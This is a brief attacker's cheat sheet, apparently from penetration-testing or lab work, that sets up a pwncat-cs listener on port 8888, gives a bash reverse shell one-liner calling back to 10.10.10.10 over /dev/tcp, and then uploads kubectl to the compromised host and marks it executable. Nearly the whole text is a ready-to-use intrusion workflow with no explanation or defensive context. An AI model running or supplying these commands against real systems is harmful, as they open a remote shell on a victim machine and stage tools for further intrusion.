https://www.revshells.com
Copy payload from pwncat

Install pwncat
```bash
sudo pip install pwncat-cs

pwncat-cs -lp 8888
```

Pase payload 
sh -i >& /dev/tcp/10.10.10.10/8888 0>&1



Ctrl+c -> go back to local
```bash
upload /opt/kubectl
```
Ctrl+d -> go back to remote
```bash
chmod +x ./kubectl
```




